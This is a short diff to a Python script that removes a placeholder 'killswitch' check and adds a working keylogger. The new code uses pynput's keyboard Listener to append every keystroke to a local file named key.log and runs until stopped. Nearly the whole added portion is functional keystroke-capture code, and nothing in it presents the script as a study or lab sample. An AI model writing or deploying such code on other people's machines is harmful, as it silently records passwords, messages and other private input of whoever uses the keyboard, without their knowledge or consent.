@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
 
-import os
+from pynput.keyboard import Listener
 
-killswitch = True
+def keypress(key):
+    with open('key.log', 'a') as file:
+        file.write(str(key) +'\n')
 
-# Killswitch
-
-if killswitch == False:
-    print ("Execution terminated")
-    exit()
+with Listener(on_press=keypress) as listener:
+    listener.join()
 
